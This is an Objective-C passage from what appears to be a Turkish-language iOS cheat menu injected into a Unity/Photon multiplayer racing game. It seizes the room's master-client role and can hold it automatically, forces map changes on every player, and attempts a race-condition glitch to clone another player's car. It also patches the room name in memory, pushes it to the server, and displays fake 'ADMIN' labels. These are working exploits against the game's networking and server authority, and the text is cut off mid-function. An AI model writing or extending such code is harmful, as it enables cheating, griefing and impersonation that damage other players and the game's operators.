// User raporu: bazen harita degistiginde araba degisiyor. Bu bir race condition —
// hedef oyuncu secip hizli harita degisimi ile araba klonlamayi denemek.
// NOT: Bu deneysel. Sunucu kaydını tam degistirmez — sadece client-side aktarilir.
static NSString *g_carCloneTargetNick = nil;
static int       g_carCloneTargetActor = -1;

// v86: YUMUŞAK race — tek map switch + master onayi. Spam YOK (oda donuyordu).
static void few1n_startCarCloneAttempt(NSString *scene) {
    if (!scene) scene = @"Desert";
    NSString *sceneCopy = [scene copy];
    FLog([NSString stringWithFormat:@"🚗 [KLON v86] '%@' (actor=%d) — yumusak race baslattı", g_carCloneTargetNick ?: @"?", g_carCloneTargetActor]);
    few1n_claimMaster();
    // Master onayi icin bekle, sonra TEK bir map switch — race dogal olarak tetiklenirse tutar
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        if (pn_loadLevelStr) {
            void* s = mkStr(sceneCopy);
            if (s) { pn_loadLevelStr(s); FLog([NSString stringWithFormat:@"🗺️ [KLON] '%@' map switch gonderildi", sceneCopy]); }
        }
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            FLog(@"🚗 [KLON] Bitti — arac degisti mi bak. Tutmazsa tekrar bas, oda donmez.");
        });
    });
}

// ===== HARITA YONTEMLERI (test - her yontem AYRI buton) =====
// Master alir, sonra secilen yontemle harita degistirmeyi dener. Hangisi calisiyor bulmak icin.
// TURKCE -> ICINDEKI (oyunun kullandigi ingilizce isim) esleme tablosu
- (void)askSceneNameThen:(int)method {
    if (method == 5) {
        // Sahne indeksi - sayi ister
        UIAlertController *ix = [UIAlertController alertControllerWithTitle:@"🔢 Yöntem 5 - Sahne İndeksi"
            message:@"0-30 arası sayı dene (0=menü, 1+=harita):" preferredStyle:UIAlertControllerStyleAlert];
        [ix addTextFieldWithConfigurationHandler:^(UITextField *tf){ tf.keyboardType = UIKeyboardTypeNumberPad; tf.text = @"2"; tf.placeholder = @"örnek: 2"; }];
        [ix addAction:[UIAlertAction actionWithTitle:@"Yükle" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
            NSString *inp = ix.textFields.firstObject.text ?: @"0";
            few1n_claimMaster();
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                if (!pn_loadLevelInt) { FLog(@"[Y5] LoadLevel(int) NULL"); return; }
                int idx = [inp intValue];
                @try { pn_loadLevelInt(idx); FLog([NSString stringWithFormat:@"[Y5] PhotonNetwork.LoadLevel(%d) gonderildi", idx]); } @catch (...) { FLog(@"[Y5] EXCEPTION"); }
            });
        }]];
        [ix addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
        [self present:ix];
        return;
    }
    // Diger yontemler: TURKCE harita listesi
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:[NSString stringWithFormat:@"🗺 Yöntem %d - Harita Seç", method]
        message:@"Türkçe adı seç, kod arkada oyunun beklediği ingilizce ismi gönderir:"
        preferredStyle:UIAlertControllerStyleActionSheet];
    // [Turkce isim, oyunun internal ismi]
    NSArray *maps = @[
        @[@"🛣️ Otoyol",          @"Highway"],
        @[@"🏜️ Çöl",              @"Desert"],
        @[@"🏙️ Şehir",            @"City"],
        @[@"🌲 Orman",            @"Forest"],
        @[@"⛰️ Dağ Yolu / Off-road", @"Offroad"],
        @[@"🏎️ Drift Yeri / Yarış Pisti", @"Track"],
        @[@"⚓ Liman",             @"Port"],
    ];
    for (NSArray *m in maps) {
        NSString *nice = m[0], *internal = m[1];
        [ac addAction:[UIAlertAction actionWithTitle:[NSString stringWithFormat:@"%@   (→ %@)", nice, internal]
            style:UIAlertActionStyleDefault handler:^(UIAlertAction *act){
            [self runMapMethod:method scene:internal];
        }]];
    }
    [ac addAction:[UIAlertAction actionWithTitle:@"✏️ Özel isim yaz (elle)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        UIAlertController *cx = [UIAlertController alertControllerWithTitle:@"✏️ Özel Sahne Adı"
            message:@"Sahne adı yaz (İngilizce internal isim):" preferredStyle:UIAlertControllerStyleAlert];
        [cx addTextFieldWithConfigurationHandler:^(UITextField *tf){ tf.text = @"Desert"; tf.placeholder = @"Örnek: Desert"; }];
        [cx addAction:[UIAlertAction actionWithTitle:@"Dene" style:UIAlertActionStyleDefault handler:^(UIAlertAction *b){
            NSString *inp = cx.textFields.firstObject.text ?: @"";
            [self runMapMethod:method scene:inp];
        }]];
        [cx addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
        [self present:cx];
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
    if (ac.popoverPresentationController) {
        ac.popoverPresentationController.sourceView = self.panel;
        ac.popoverPresentationController.sourceRect = CGRectMake(self.panel.bounds.size.width/2, 80, 1, 1);
    }
    [self present:ac];
}
// Ortak yontem calistirici (Turkce'den donusen ingilizce sahne adiyla cagriliyor)
- (void)runMapMethod:(int)method scene:(NSString*)inp {
    few1n_claimMaster();
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        // Master gercekten alindi mi kontrol et
        bool amMaster = false;
        @try {
            if (pn_getLocalPlayer && ply_getIsMaster) {
                void* me = pn_getLocalPlayer();
                if (me) amMaster = ply_getIsMaster(me);
            }
        } @catch (...) {}
        if (!amMaster) FLog([NSString stringWithFormat:@"⚠️ [Y%d] Master alinamadi — sunucu reddedebilir", method]);
        @try {
            if (method == 1) {
                if (!mapSel_selectMap || !lobbyStartGame || !lobbyGetInst) { FLog(@"[Y1] Pointerler hazir degil"); return; }
                void* lobby = lobbyGetInst(); if (!ptrOk(lobby)) { FLog(@"[Y1] Lobby yok"); return; }
                void* mapSel = *(void**)((uintptr_t)lobby + 0x28);
                if (!ptrOk(mapSel)) { FLog(@"[Y1] mapSelection null"); return; }
                void* s = mkStr(inp); if (!s) return;
                mapSel_selectMap(mapSel, s);
                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.15 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                    @try { lobbyStartGame(lobby); } @catch (...) {}
                });
                FLog([NSString stringWithFormat:@"[Y1] MapSelection.SelectMap('%@') + StartGame gonderildi", inp]);
            } else if (method == 2) {
                if (!photonMgrEnp) { FLog(@"[Y2] photonMgrEnp NULL"); return; }
                void* s = mkStr(inp); if (!s) return;
                photonMgrEnp(s, false);
                FLog([NSString stringWithFormat:@"[Y2] PhotonManager.enp('%@') gonderildi", inp]);
            } else if (method == 3) {
                if (!lobbySetScene || !lobbyGetInst) { FLog(@"[Y3] Pointerler yok"); return; }
                void* lobby = lobbyGetInst(); if (!ptrOk(lobby)) { FLog(@"[Y3] Lobby yok"); return; }
                void* s = mkStr(inp); if (!s) return;
                lobbySetScene(lobby, s);
                FLog([NSString stringWithFormat:@"[Y3] HR_PhotonLobbyManager.SetScene('%@') gonderildi", inp]);
            } else if (method == 4) {
                if (!pn_loadLevelStr) { FLog(@"[Y4] LoadLevel(string) NULL"); return; }
                void* s = mkStr(inp); if (!s) return;
                pn_loadLevelStr(s);
                FLog([NSString stringWithFormat:@"[Y4] PhotonNetwork.LoadLevel('%@') gonderildi", inp]);
            } else if (method == 5) {
                // PhotonNetwork.LoadLevel(int)  - inp int olarak parse
                if (!pn_loadLevelInt) { FLog(@"[Y5] LoadLevel(int) NULL"); return; }
                int idx = [inp intValue];
                pn_loadLevelInt(idx);
                FLog([NSString stringWithFormat:@"[Y5] PhotonNetwork.LoadLevel(%d) gonderildi", idx]);
            } else if (method == 6) {
                // HR_MainMenuHandler.StartRace() - lobi'den oda-icine yarisa baslama
                if (!hrMainStartRace) { FLog(@"[Y6] StartRace NULL"); return; }
                void* mh = NULL;
                if (g_mmhField && i_field_static_get_value) { @try { i_field_static_get_value(g_mmhField, &mh); } @catch (...) {} }
                if (!ptrOk(mh)) { FLog(@"[Y6] MainMenuHandler instance yok (menu ekraninda dene)"); return; }
                hrMainStartRace(mh);
                FLog([NSString stringWithFormat:@"[Y6] HR_MainMenuHandler.StartRace() gonderildi (sahne '%@' bu yontemde kullanilmaz)", inp]);
            } else if (method == 7) {
                // Unity SceneManager.LoadScene(string) - YEREL (sadece SEN degisirsin)
                if (!unity_LoadSceneStr) { FLog(@"[Y7] Unity.LoadScene NULL"); return; }
                void* s = mkStr(inp); if (!s) return;
                unity_LoadSceneStr(s);
                FLog([NSString stringWithFormat:@"[Y7] Unity.SceneManager.LoadScene('%@') - YEREL (sadece sen)", inp]);
            } else if (method == 8) {
                // Unity SceneManager.LoadScene(int) - YEREL (sadece SEN)
                if (!unity_LoadSceneInt) { FLog(@"[Y8] Unity.LoadScene(int) NULL"); return; }
                int idx = [inp intValue];
                unity_LoadSceneInt(idx);
                FLog([NSString stringWithFormat:@"[Y8] Unity.SceneManager.LoadScene(%d) - YEREL", idx]);
            }
        } @catch (...) { FLog([NSString stringWithFormat:@"[Y%d] EXCEPTION!", method]); }
    });
}
- (void)mapMethod1 { [self askSceneNameThen:1]; }
- (void)mapMethod2 { [self askSceneNameThen:2]; }
- (void)mapMethod3 { [self askSceneNameThen:3]; }
- (void)mapMethod4 { [self askSceneNameThen:4]; }
- (void)mapMethod5 { [self askSceneNameThen:5]; }
- (void)mapMethod6 { [self askSceneNameThen:6]; }
- (void)mapMethod7 { [self askSceneNameThen:7]; }
- (void)mapMethod8 { [self askSceneNameThen:8]; }

// ===== v70 KLASIK: MASTER CLAIM YAPMADAN direkt lobby+MapSelection+StartGame =====
// v70 build'inde bu yaklasim calisiyordu (kullanici raporu).
// v73'teki fark: few1n_claimMaster once cagriliyordu, muhtemelen sunucu CAS mismatch nedeniyle
// sonraki MapSelection/StartGame istegini reddediyor. Bu yontem direkt oyunun kendi butonunu
// tetiklemesi gibi davranir — zaten master iseniz calisir, degilseniz oyun kendisi reddeder.
- (void)toggleMasterClaim {
    isMasterClaimDisabled = !isMasterClaimDisabled;
    saveBool(@"masterClaimOff", isMasterClaimDisabled);
    FLog([NSString stringWithFormat:@"⚙️ Master Claim %@ (v70 modu %@)",
        isMasterClaimDisabled ? @"KAPATILDI" : @"ACILDI",
        isMasterClaimDisabled ? @"aktif" : @"kapali"]);
    [self refreshUI];
}

// ===== KISI ARACI KLONLA UI =====
- (void)cloneCarPicker {
    if (!pn_getInRoom || !pn_getInRoom()) {
        UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"🚗 Klonla" message:@"Odada olmalisin." preferredStyle:UIAlertControllerStyleAlert];
        [ac addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
        [self present:ac]; return;
    }
    if (!pn_getPlayerList || !ply_getNickName || !ply_getActorNumber) {
        FLog(@"[KLON] Pointerler yok"); return;
    }
    void* arr = pn_getPlayerList();
    if (!ptrOk(arr)) { FLog(@"[KLON] Oyuncu listesi yok"); return; }
    int cnt = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
    if (cnt <= 0) { FLog(@"[KLON] Oyuncu yok"); return; }
    void** players = (void**)((uintptr_t)arr + 0x20);

    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"🚗 Kimin Aracini Klonla?"
        message:@"Sec — sonra rapid map switch ile arac swap race glitch'i denenir. Basarili olmayabilir, birkac deneme gerekebilir."
        preferredStyle:UIAlertControllerStyleActionSheet];
    for (int i = 0; i < cnt && i < 32; i++) {
        void* p = players[i]; if (!ptrOk(p)) continue;
        int actor = ply_getActorNumber(p);
        void* ns = ply_getNickName(p);
        NSString *nick = ptrOk(ns) ? readStr(ns) : [NSString stringWithFormat:@"actor%d", actor];
        [ac addAction:[UIAlertAction actionWithTitle:[NSString stringWithFormat:@"%@ (actor=%d)", nick, actor]
            style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
            g_carCloneTargetActor = actor;
            g_carCloneTargetNick = nick;
            few1n_startCarCloneAttempt(@"Desert");   // Desert genelde en stabil
        }]];
    }
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    if (ac.popoverPresentationController) {
        ac.popoverPresentationController.sourceView = self.panel;
        ac.popoverPresentationController.sourceRect = CGRectMake(self.panel.bounds.size.width/2, 80, 1, 1);
    }
    [self present:ac];
}

- (void)changeMapV70Classic {
    if (!pn_getInRoom || !pn_getInRoom()) {
        UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"🕐 v70 Klasik"
            message:@"Odada olmalisin (bu yontem SEN MASTER isen calisir)." preferredStyle:UIAlertControllerStyleAlert];
        [ac addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
        [self present:ac]; return;
    }
    // Turkce -> internal isim listesi
    NSArray *maps = @[
        @[@"🛣️ Otoyol", @"Highway"], @[@"🏜️ Çöl", @"Desert"], @[@"🏙️ Şehir", @"City"],
        @[@"🌲 Orman", @"Forest"], @[@"⛰️ Off-road", @"Offroad"],
        @[@"🏎️ Track", @"Track"], @[@"⚓ Port", @"Port"],
    ];
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"🕐 v70 Klasik Harita"
        message:@"Master claim YAPMADAN direkt cagirir. Sen master isen herkeste degisir."
        preferredStyle:UIAlertControllerStyleActionSheet];
    for (NSArray *m in maps) {
        NSString *nice = m[0], *internal = m[1];
        [ac addAction:[UIAlertAction actionWithTitle:[NSString stringWithFormat:@"%@ (%@)", nice, internal]
            style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
            @try {
                if (!mapSel_selectMap || !lobbyStartGame || !lobbyGetInst) { FLog(@"[v70] Pointerler yok"); return; }
                void* lobby = lobbyGetInst();
                if (!ptrOk(lobby)) { FLog(@"[v70] Lobby yok"); return; }
                void* mapSel = *(void**)((uintptr_t)lobby + 0x28);
                if (!ptrOk(mapSel)) { FLog(@"[v70] mapSelection null"); return; }
                void* s = mkStr(internal);
                if (!s) return;
                mapSel_selectMap(mapSel, s);
                FLog([NSString stringWithFormat:@"🕐 [v70] SelectMap('%@') cagrildi, 200ms sonra StartGame", internal]);
                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                    @try { lobbyStartGame(lobby); FLog(@"🕐 [v70] StartGameButton() cagrildi"); } @catch (...) { FLog(@"[v70] StartGame exception"); }
                });
            } @catch (...) { FLog(@"[v70] EXCEPTION"); }
        }]];
    }
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    if (ac.popoverPresentationController) {
        ac.popoverPresentationController.sourceView = self.panel;
        ac.popoverPresentationController.sourceRect = CGRectMake(self.panel.bounds.size.width/2, 80, 1, 1);
    }
    [self present:ac];
}

- (void)changeMapInRoom {
    if (!pn_getInRoom || !pn_getInRoom()) {
        UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"🗺️ Harita Degistir"
            message:@"Harita degistirmek icin bir odada olmalisin." preferredStyle:UIAlertControllerStyleAlert];
        [ac addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
        [self present:ac];
        return;
    }

    NSString *curScene = (pn_getActiveSceneName) ? readStr(pn_getActiveSceneName()) : @"?";

    // Oyunun KENDI MapList'inden gercek sahne adlarini oku (isim tahmini YOK -> kesin dogru)
    NSArray<NSString*> *realMaps = few1n_readMapNames();

    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"🗺️ Harita Degistir"
        message:[NSString stringWithFormat:@"Mevcut: %@\nHerkes sectigin haritaya gecer.", curScene]
        preferredStyle:UIAlertControllerStyleAlert];

    if (realMaps.count > 0) {
        // MapList okundu -> oyunun GERCEK harita adlariyla buton olustur (kesin calisir)
        int i = 0;
        for (NSString *mapName in realMaps) {
            int idx = i++;
            NSString *lower = mapName.lowercaseString;
            NSString *displayName;

            // Genis TR eslesme — icerik icerik yakalar (Desert, Desert_v2, DesertRace hepsi calisir)
            if      ([lower containsString:@"desert"])   displayName = @"🏜️ ÇÖL";
            else if ([lower containsString:@"night"] && [lower containsString:@"city"]) displayName = @"🌙 GECE ŞEHRİ";
            else if ([lower containsString:@"city"])     displayName = @"🏙️ ŞEHİR";
            else if ([lower containsString:@"highway"])  displayName = @"🛣️ OTOYOL";
            else if ([lower containsString:@"autobahn"]) displayName = @"🛣️ OTOYOL (Autobahn)";
            else if ([lower containsString:@"drift"])    displayName = @"🌀 DRİFT PİSTİ";
            else if ([lower containsString:@"track"])    displayName = @"🏎️ YARIŞ PİSTİ";
            else if ([lower containsString:@"race"])     displayName = @"🏁 YARIŞ";
            else if ([lower containsString:@"port"])     displayName = @"⚓ LİMAN";
            else if ([lower containsString:@"harbor"])   displayName = @"⚓ LİMAN (Harbor)";
            else if ([lower containsString:@"offroad"])  displayName = @"⛰️ ARAZI / DAĞ YOLU";
            else if ([lower containsString:@"mountain"]) displayName = @"⛰️ DAĞ";
            else if ([lower containsString:@"forest"])   displayName = @"🌲 ORMAN";
            else if ([lower containsString:@"snow"])     displayName = @"❄️ KAR";
            else if ([lower containsString:@"winter"])   displayName = @"❄️ KIŞ";
            else if ([lower containsString:@"beach"])    displayName = @"🏖️ PLAJ";
            else if ([lower containsString:@"garage"])   displayName = @"🔧 GARAJ";
            else if ([lower containsString:@"lobby"] || [lower containsString:@"menu"]) displayName = @"🏠 MENÜ/LOBI";
            else                                          displayName = [NSString stringWithFormat:@"❓ %@", mapName];

            // Ingilizce ad'i parantez icinde ek — kullanici hangisi oldugunu tam gorsun
            NSString *fullDisplay = [NSString stringWithFormat:@"%@   (%@)", displayName, mapName];

            [ac addAction:[UIAlertAction actionWithTitle:fullDisplay style:UIAlertActionStyleDefault handler:^(UIAlertAction *act){
                few1n_loadMap(mapName, idx);
            }]];
        }
    } else {
        // MapList okunamadi (henuz init olmadi) -> bilinen sahne adlariyla dene (fallback)
        NSArray *buildMaps = @[
            @{@"title": @"🏜️ ÇÖL   (Desert)",                @"scene": @"Desert",    @"idx": @3},
            @{@"title": @"🏙️ ŞEHİR   (City)",                @"scene": @"City",      @"idx": @1},
            @{@"title": @"🛣️ OTOYOL   (Highway)",            @"scene": @"Highway",   @"idx": @2},
            @{@"title": @"🏎️ YARIŞ PİSTİ   (Track)",         @"scene": @"Track",     @"idx": @0},
            @{@"title": @"⚓ LİMAN   (Port)",                 @"scene": @"Port",      @"idx": @4},
            @{@"title": @"⛰️ ARAZI / DAĞ YOLU   (Offroad)",   @"scene": @"Offroad",   @"idx": @5},
            @{@"title": @"🌲 ORMAN   (Forest)",               @"scene": @"Forest",    @"idx": @6},
            @{@"title": @"🌙 GECE ŞEHRİ   (City Night)",      @"scene": @"City Night",@"idx": @7},
        ];
        for (NSDictionary *m in buildMaps) {
            NSString *title = m[@"title"];
            NSString *scene = m[@"scene"];
            int idx         = [m[@"idx"] intValue];
            [ac addAction:[UIAlertAction actionWithTitle:title style:UIAlertActionStyleDefault handler:^(UIAlertAction *act){
                few1n_loadMap(scene, idx);
            }]];
        }
    }

    // Ozel sahne adi yazma secenegi
    [ac addAction:[UIAlertAction actionWithTitle:@"✏️ Özel Sahne Adı Yaz" style:UIAlertActionStyleDefault handler:^(UIAlertAction *act){
        UIAlertController *inputAc = [UIAlertController alertControllerWithTitle:@"✏️ Özel Sahne"
            message:@"Sahne adini yaz:" preferredStyle:UIAlertControllerStyleAlert];
        [inputAc addTextFieldWithConfigurationHandler:^(UITextField *tf){
            tf.placeholder = @"Ornek: Desert, Highway, City ...";
        }];
        [inputAc addAction:[UIAlertAction actionWithTitle:@"Yükle" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a2){
            NSString *val = inputAc.textFields.firstObject.text;
            if (val && val.length > 0) {
                few1n_loadMap(val, -1);
            }
        }]];
        [inputAc addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
        [self present:inputAc];
    }]];

    [ac addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

// ===== ODADAYKEN ANLIK ODA ISMINI DEGISTIR =====
- (void)changeRoomNameInRoom {
    if (!pn_getInRoom || !pn_getInRoom()) {
        FLog(@"❌ Odada degilsin - once bir odaya gir!");
        UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"✏️ Oda İsmini Değiştir"
            message:@"Oda ismini değiştirmek için bir odada olmalısın." preferredStyle:UIAlertControllerStyleAlert];
        [ac addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
        [self present:ac];
        return;
    }

    // 1) Master Client yetkisini al
    few1n_claimMaster();

    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"✏️ Odadayken Oda İsmini Değiştir"
        message:@"Odanın yeni ismini yaz (Rich Text destekli):\n(Lobi kartında ve oyun içinde anında değişir)" preferredStyle:UIAlertControllerStyleAlert];

    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){
        tf.text = [NSString stringWithUTF8String:customRoomName];
        tf.placeholder = @"Örn: <#FF0000><b>FEW1N YENİ ODA</b>";
        tf.clearButtonMode = UITextFieldViewModeAlways;
    }];

    [ac addAction:[UIAlertAction actionWithTitle:@"Değiştir & Güncelle" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        NSString *newName = ac.textFields.firstObject.text;
        if (!newName || newName.length == 0) newName = @"FEW1N ODA";
        strncpy(customRoomName, newName.UTF8String, sizeof(customRoomName)-1);
        customRoomName[sizeof(customRoomName)-1] = '\0';
        saveStr(@"roomName", newName);

        @try {
            NSString *uniq = [newName stringByAppendingString:@"​"];
            void* nameStr = mkStr(uniq);

            // 1) CLIENT-SIDE memory patch — RoomInfo.name @ 0x40 (hızlı, sadece senin ekranında ve mod'lu client'larda görülür)
            if (pn_getCurrentRoom && nameStr) {
                void* room = pn_getCurrentRoom();
                if (ptrOk(room)) {
                    *(void**)((uintptr_t)room + 0x40) = nameStr;
                    FLog([NSString stringWithFormat:@"✓ Metod 1 Room.Name (0x40) client-side yazildi: '%@'", newName]);

                    // v114.4: Metod 2 - SUNUCU push - Room.set_Name(string) invoke
                    // Bu Photon internal method; sunucuya sync eder mi denemek lazim
                    if (g_mRoomSetName && i_runtime_invoke && nameStr) {
                        @try {
                            void* args[1]; args[0] = nameStr;
                            i_runtime_invoke(g_mRoomSetName, room, args, NULL);
                            FLog(@"✓ Metod 2 Room.set_Name(string) invoke edildi (sunucu push)");
                        } @catch (...) { FLog(@"✗ Metod 2 Room.set_Name exception"); }
                    } else FLog(@"- Metod 2 g_mRoomSetName YOK");

                    // 2) SUNUCU-TARAFLI SYNC — CustomProperties["customName"] = newName
                    // v114.11: hardcoded room_setCustomProperties bug'ini paylasiyordu (0x5916158
                    // yeni build'lerde get_NickName'e sapiyor). Ayni il2cpp-by-name yolu.
                    few1n_claimMaster();
                    few1n_after(1.2, ^{
                        if (few1n_ensureRoomApi() && g_hashtableClass) {
                            NSDictionary *dict = @{ @"customName": newName };
                            void* ht = mkPhotonHashtable(dict);
                            if (ht && ptrOk(room) && g_mRoomSetCustomProperties && i_runtime_invoke) {
                                @try {
                                    void *args[3] = { ht, NULL, NULL };
                                    void *ret = i_runtime_invoke(g_mRoomSetCustomProperties, room, args, NULL);
                                    bool ok = few1n_unboxBool(ret);
                                    FLog([NSString stringWithFormat:@"🎨 Oda ismi server sync: SetCustomProperties(customName='%@') → %s", newName, ok?"OK":"FAIL"]);
                                } @catch (...) { FLog(@"🎨 SetCustomProperties exception"); }
                            }
                        }
                    });
                }
            }

            // Renkli Oda ve Harita etiketi override modlarını aktif et
            isColorRoomForce = true;
            saveBool(@"colorroomforce", true);

            FLog([NSString stringWithFormat:@"✓ Oda ismi odadayken anlık değiştirildi: '%@'", newName]);
        } @catch (...) { FLog(@"Oda ismi değiştirme hatası"); }
    }]];

    [ac addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

// ===== HARİTA METNİNİ DEĞİŞTİR (KİŞİ SAYISININ SOLUNDAKİ ETİKET) =====
- (void)changeCustomMapLabel {
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"🏷️ Harita Metnini Değiştir"
        message:@"Kişi sayısının solundaki 'Otoban Gün Batımı' yazısını istediğin metinle değiştir (Rich Text Destekli):" preferredStyle:UIAlertControllerStyleAlert];

    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){
        tf.text = (strlen(customMapTextOverride) > 0) ? [NSString stringWithUTF8String:customMapTextOverride] : @"<#FF0000><b>👑 ADMIN 👑</b>";
        tf.placeholder = @"Örn: <#FF0000><b>👑 ADMIN 👑</b>";
        tf.clearButtonMode = UITextFieldViewModeAlways;
    }];

    [ac addAction:[UIAlertAction actionWithTitle:@"🛣️ Otoban (Gün Batımı)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        strncpy(customMapTextOverride, "<#FF7F00><b>🛣️ Otoban (Gün Batımı)</b>", sizeof(customMapTextOverride)-1);
        isMapTextOverrideEnabled = true;
        FLog(@"Harita etiketi 'Otoban Gün Batımı' olarak ayarlandı!");
    }]];

    [ac addAction:[UIAlertAction actionWithTitle:@"🏜️ Çöl Yolu (Güneşli)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        strncpy(customMapTextOverride, "<#FFFF00><b>🏜️ Çöl Yolu (Güneşli)</b>", sizeof(customMapTextOverride)-1);
        isMapTextOverrideEnabled = true;
        FLog(@"Harita etiketi 'Çöl Yolu Güneşli' olarak ayarlandı!");
    }]];

    [ac addAction:[UIAlertAction actionWithTitle:@"🌲 Orman & Dağ Yolu" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        strncpy(customMapTextOverride, "<#00FF00><b>🌲 Orman & Dağ Yolu</b>", sizeof(customMapTextOverride)-1);
        isMapTextOverrideEnabled = true;
        FLog(@"Harita etiketi 'Orman & Dağ Yolu' olarak ayarlandı!");
    }]];

    [ac addAction:[UIAlertAction actionWithTitle:@"🏎️ Drift Yeri & Pist" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        strncpy(customMapTextOverride, "<#FF00FF><b>🏎️ Drift Yeri & Pist</b>", sizeof(customMapTextOverride)-1);
        isMapTextOverrideEnabled = true;
        FLog(@"Harita etiketi 'Drift Yeri' olarak ayarlandı!");
    }]];

    [ac addAction:[UIAlertAction actionWithTitle:@"🌙 Otoban (Gece)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        strncpy(customMapTextOverride, "<#00FFFF><b>🌙 Otoban (Gece)</b>", sizeof(customMapTextOverride)-1);
        isMapTextOverrideEnabled = true;
        FLog(@"Harita etiketi 'Otoban Gece' olarak ayarlandı!");
    }]];

    [ac addAction:[UIAlertAction actionWithTitle:@"🌧️ Yağmurlu & Sisli Hava" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        strncpy(customMapTextOverride, "<#AAAAAA><b>🌧️ Yağmurlu & Sisli</b>", sizeof(customMapTextOverride)-1);
        isMapTextOverrideEnabled = true;
        FLog(@"Harita etiketi 'Yağmurlu & Sisli' olarak ayarlandı!");
    }]];

    [ac addAction:[UIAlertAction actionWithTitle:@"👑 ADMIN" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        strncpy(customMapTextOverride, "<#FF0000><b>👑 ADMIN 👑</b>", sizeof(customMapTextOverride)-1);
        isMapTextOverrideEnabled = true;
    }]];

    [ac addAction:[UIAlertAction actionWithTitle:@"🔥 FEW1N VIP" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        strncpy(customMapTextOverride, "<#00FFFF><b>🔥 FEW1N VIP 🔥</b>", sizeof(customMapTextOverride)-1);
        isMapTextOverrideEnabled = true;
    }]];

    [ac addAction:[UIAlertAction actionWithTitle:@"Uygula (Yazılan Metin)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        NSString *txt = ac.textFields.firstObject.text;
        if (txt && txt.length > 0) {
            strncpy(customMapTextOverride, txt.UTF8String, sizeof(customMapTextOverride)-1);
            isMapTextOverrideEnabled = true;
            FLog([NSString stringWithFormat:@"Özel harita etiketi ayarlandı: %@", txt]);
        }
    }]];

    [ac addAction:[UIAlertAction actionWithTitle:@"🔄 Sıfırla (Orjinal Harita Adı)" style:UIAlertActionStyleDestructive handler:^(UIAlertAction *a){
        isMapTextOverrideEnabled = false;
        customMapTextOverride[0] = '\0';
        FLog(@"Harita etiketi orijinal harita adına sıfırlandı!");
    }]];

    [ac addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

// ===== OTOMATIK MASTER =====
- (void)tapAutoMaster {
    isAutoMasterEnabled = !isAutoMasterEnabled;
    saveBool(@"automaster", isAutoMasterEnabled);
    NSString *durum = isAutoMasterEnabled ? @"🤖 ACIK - Master gidince aninda geri alinir" : @"❌ KAPALI";
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"🤖 Otomatik Master"
        message:[NSString stringWithFormat:@"Durum: %@", durum] preferredStyle:UIAlertControllerStyleAlert];
    [ac addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
    [self present:ac];
    FLog([NSString stringWithFormat:@"🤖 AutoMaster: %d", isAutoMasterEnabled]);
}

// ===== OYUN HIZI (TIMESCALE) =====
- (void)tapGameSpeed {
